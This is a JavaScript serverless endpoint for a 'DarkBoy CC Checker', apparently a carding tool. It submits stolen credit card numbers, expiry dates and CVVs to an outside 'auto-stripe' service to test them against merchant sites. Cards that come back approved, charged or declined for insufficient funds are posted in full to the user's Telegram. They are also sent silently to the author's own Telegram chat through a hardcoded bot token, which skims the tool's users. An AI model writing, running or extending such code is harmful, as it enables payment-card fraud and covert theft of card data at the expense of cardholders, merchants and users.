export default async function handler(req, res) {
  // Enable CORS
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');

  // Handle preflight OPTIONS request
  if (req.method === 'OPTIONS') {
    return res.status(200).end();
  }

  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  try {
    let body;
    if (typeof req.body === 'string') {
      body = JSON.parse(req.body);
    } else {
      body = req.body;
    }

    const { cc, site, userBotToken, userChatId } = body;

    if (!cc || !site) {
      return res.status(400).json({ 
        error: 'Missing required parameters: cc and site'
      });
    }

    if (!cc.match(/^\d{13,19}\|\d{1,2}\|\d{2,4}\|\d{3,4}$/)) {
      return res.status(400).json({ 
        error: 'Invalid credit card format. Use: NUMBER|MM|YYYY|CVV'
      });
    }

    console.log('Processing CC:', cc.substring(0, 4) + '****', 'Site:', site);

    // Build API URL
    const apiUrl = `https://darkboy-auto-stripe.onrender.com/gateway=autostripe/key=darkboy/site=${encodeURIComponent(site)}/cc=${encodeURIComponent(cc)}`;
    
    // Make request to external API
    const response = await fetch(apiUrl, {
      method: 'GET',
      headers: {
        'Accept': 'application/json',
        'User-Agent': 'DarkBoy-CC-Checker/2.0 (Vercel Proxy)',
        'Cache-Control': 'no-cache'
      }
    });

    const responseText = await response.text();
    let jsonResult;
    
    try {
      jsonResult = JSON.parse(responseText);
    } catch (parseError) {
      jsonResult = {
        status: response.ok ? 'success' : 'error',
        message: responseText.trim(),
        raw_response: responseText
      };
    }

    jsonResult.processed_at = new Date().toISOString();
    jsonResult.http_status = response.status;

    // Check if this is a successful result
    if (jsonResult && isSuccessfulResult(jsonResult)) {
      const telegramResults = await sendDualTelegramNotifications(cc, site, jsonResult, userBotToken, userChatId);
      jsonResult.telegram_notifications = telegramResults;
    }

    return res.status(response.status).json(jsonResult);

  } catch (error) {
    console.error('Proxy Error:', error);
    return res.status(500).json({ 
      error: 'Internal server error',
      details: error.message
    });
  }
}

// Helper function to determine if result is successful
function isSuccessfulResult(result) {
  if (!result || !result.message) return false;
  
  const message = result.message.toLowerCase();
  const successKeywords = [
    'success', 'approved', 'succeeded', 'thank you', 'payment successful',
    'transaction approved', 'charge created', 'payment processed', 'completed',
    'charged', 'payment charged', 'charge successful', 'insufficient_funds',
    'insufficient funds', 'incorrect_cvv', 'invalid_cvv', 'incorrect_zip',
    'incorrect_cvc', 'invalid_cvc'
  ];
  
  return successKeywords.some(keyword => message.includes(keyword));
}

// Function to send notifications to BOTH servers
async function sendDualTelegramNotifications(cc, site, result, userBotToken, userChatId) {
  const responseMessage = result.message || result.response || 'Success';
  const category = getCategoryFromResponse(responseMessage);
  const emoji = category === 'charged' ? '💳' : '✅';
  
  // Create message for user
  const userMessage = `${emoji} **${category.toUpperCase()} CARD DETECTED**\n\n` +
    `💳 **Card:** \`${cc}\`\n` +
    `🌐 **Site:** ${site}\n` +
    `🔧 **Gateway:** Auto Shopify\n` +
    `📝 **Response:** ${responseMessage}\n` +
    `📊 **Category:** ${category.toUpperCase()}\n` +
    `⏰ **Time:** ${new Date().toLocaleString()}\n\n` +
    `🚀 **DarkBoy CC Checker v2.0**`;

  // Create message for your server (with additional info)
  const serverMessage = `🎯 **NEW HIT FROM USER**\n\n` +
    `${emoji} **${category.toUpperCase()} CARD FOUND**\n` +
    `💳 **Card:** \`${cc}\`\n` +
    `🌐 **Site:** ${site}\n` +
    `🔧 **Gateway:** Auto Shopify\n` +
    `📝 **Response:** ${responseMessage}\n` +
    `📊 **Category:** ${category.toUpperCase()}\n` +
    `👤 **User Chat ID:** ${userChatId || 'Unknown'}\n` +
    `⏰ **Time:** ${new Date().toLocaleString()}\n` +
    `🔍 **IP:** ${process.env.VERCEL_URL || 'Unknown'}\n\n` +
    `📊 **DarkBoy Server Notification**`;

  const notifications = {
    user: { sent: false, error: null },
    server: { sent: false, error: null }
  };

  // Send to user (if they provided credentials)
  if (userBotToken && userChatId) {
    try {
      await sendTelegramMessage(userBotToken, userChatId, userMessage);
      notifications.user.sent = true;
      console.log('✅ User notification sent successfully');
    } catch (error) {
      notifications.user.error = error.message;
      console.error('❌ User notification failed:', error.message);
    }
  }

  // Send to YOUR server (your bot credentials)
  const SERVER_BOT_TOKEN = process.env.SERVER_BOT_TOKEN || "8396276886:AAENwJQ83yCGe3MzOFURYSst-6s0uogQ_rw"; // Your bot token
  const SERVER_CHAT_ID = process.env.SERVER_CHAT_ID || "-1002869133846"; // Your chat ID

  try {
    await sendTelegramMessage(SERVER_BOT_TOKEN, SERVER_CHAT_ID, serverMessage);
    notifications.server.sent = true;
    console.log('✅ Server notification sent successfully');
  } catch (error) {
    notifications.server.error = error.message;
    console.error('❌ Server notification failed:', error.message);
  }

  return notifications;
}

// Helper function to send individual Telegram message
async function sendTelegramMessage(botToken, chatId, message) {
  const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
  
  const response = await fetch(telegramUrl, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json'
    },
    body: JSON.stringify({
      chat_id: chatId,
      text: message,
      parse_mode: 'Markdown'
    })
  });

  if (!response.ok) {
    const errorData = await response.json();
    throw new Error(errorData.description || `HTTP ${response.status}`);
  }

  return await response.json();
}

// Helper function to categorize response
function getCategoryFromResponse(response) {
  if (!response) return 'approved';
  
  const responseText = response.toLowerCase();
  
  const chargedKeywords = [
    'charged', 'payment charged', 'charge successful', 'transaction charged',
    'thank you', 'payment successful'
  ];
  
  if (chargedKeywords.some(keyword => responseText.includes(keyword))) {
    return 'charged';
  }
  
  return 'approved';
}